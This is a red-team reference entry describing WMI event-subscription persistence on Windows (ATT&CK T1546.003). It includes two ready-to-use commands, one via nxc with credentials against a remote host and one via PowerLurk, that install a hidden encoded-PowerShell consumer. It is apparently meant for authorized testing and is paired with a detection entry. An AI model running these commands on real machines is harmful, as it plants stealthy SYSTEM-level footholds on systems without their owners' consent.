---
id: wmi-subscription
title: WMI event-subscription persistence (permanent consumer)
section: Persistence (authorized engagements only)
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1546.003]
platform: [windows]
source: hacktheplanet §"Persistence (authorized engagements only)"
pair: wmi-subscription-sysmon
---

The fileless persistence classic: bind an `__EventFilter` (a trigger — a clock
time, logon, a process start) to a `CommandLineEventConsumer` (your payload) with
a `__FilterToConsumerBinding`. It lives in the WMI repository, survives reboot,
runs as SYSTEM, and touches no Run key or scheduled task. PowerLurk's
`Register-MaliciousWmiEvent` is the easy local PoC. Authorized only.

```sh
nxc smb {{rhost}} -u {{user}} -p {{password}} -M wmi-event -o CONSUMER='powershell -w hidden -enc <b64>'
Register-MaliciousWmiEvent -EventName Persist -PermanentCommand "powershell -w hidden -enc <b64>" -Trigger ProcessStart -ProcessName notepad.exe
```
